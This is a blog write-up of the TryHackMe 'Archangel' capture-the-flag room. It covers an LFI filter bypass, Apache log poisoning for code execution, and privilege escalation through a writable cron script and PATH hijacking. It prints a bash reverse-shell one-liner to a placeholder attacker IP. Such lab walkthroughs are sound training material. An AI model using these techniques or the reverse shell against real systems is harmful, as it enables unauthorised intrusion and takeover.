---
layout: post
title: "Archangel Write Up"
categories: [cybersecurity, writeUps, tryHackMe]
---

This is a write up for the room [Archangel](https://tryhackme.com/room/archangel) from [tryhackme](https://tryhackme.com).

<!-- MarkdownTOC -->

- [Initial Enumeration](#initial-enumeration)
- [Exploitation](#exploitation)
- [Local Enumeration](#local-enumeration)
- [Privilege Escalation](#privilege-escalation)

<!-- /MarkdownTOC -->

## Initial Enumeration

`Nmap` results

![nmap](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc1.png)

We have `Ubuntu` as OS.

- Port 22 OpenSSH 7.6p1
- Port 80 Apache 2.4.29

The server on port 80 shows a web page where we can see this email direction

![email](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc2.png)

Before adding the domain to `/etc/hosts` we check the result `/flags` obtained with `gobuster`.

![flags](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc3.png)

That `flag.html` file just redirects us to a youtube music video.

Once we add the domain to our `hosts` file if we navigate to the site we have this page.

![web](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc4.png)

Running `gobuster` from this domain we find the `/test.php` page. This is supposed to be vulnerable to local file inclusion. Playing with the examples [here](https://book.hacktricks.xyz/pentesting-web/file-inclusion) we manage to download the `php` code of the application, `base64` encoded.

![b64](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc5.png)

Decoding the `base64` string we see the code.

![php](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc6.png)

## Exploitation

Here we find the second flag and we can see the filters the application has. As we can see we are forced to use the `view` parameter, the `/var/www/html/development_testing` has to be part of the crafted url and `../..` can't be included.

First we find a way to bypass the `../..` filter and test it reading `/etc/passwd`

![test1](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc7.png)

![testr1](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc8.png)

Now to turn the `lfi` vulnerability into remote code execution we are going to use log poisoning as explained [here](https://ironhackers.es/en/tutoriales/lfi-to-rce-envenenando-ssh-y-apache-logs/).

We verify we can access the apache logs

![apache](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc9.png)

![apache](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc10.png)

Next we are going to poison the logs including a `php` string into the `User-Agent` field of the request.

![poison](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc11.png)

And we test we have code execution adding `&cmd=id` at the end of the query.

![rce](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc12.png)

![id](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc13.png)

Now we change the payload

````shell
bash -c 'bash -i >&/dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
````

But url enconded

![shell](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc14.png)

And we gain a shell

![shell](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc15.png)

## Local Enumeration

The only user on the machine is `archangel`, we can read the user flag from his home directory. We have a `passwordbackup` file but is just a link to the same youtube video we saw before.

![passback](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc16.png)

We have a `cronjob` executing every minute as the user `archangel`

![crontab](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc17.png)

This executable is writable by everyone so we can modify it to gain a shell into the machine as the `archangel` user.

![shell2](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc18.png)

![shell2](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc19.png)

## Privilege Escalation

Now we can access the `secret` directory and grab the user2flag. We also have a backup executable file, owned by `root` and executable by everyone. If we try to execute it we have

![backup](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc20.png)

We modify the `PATH` environment variable and create a `cp` executable to spawn a shell as `root`.

![root](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/archangel/arc21.png)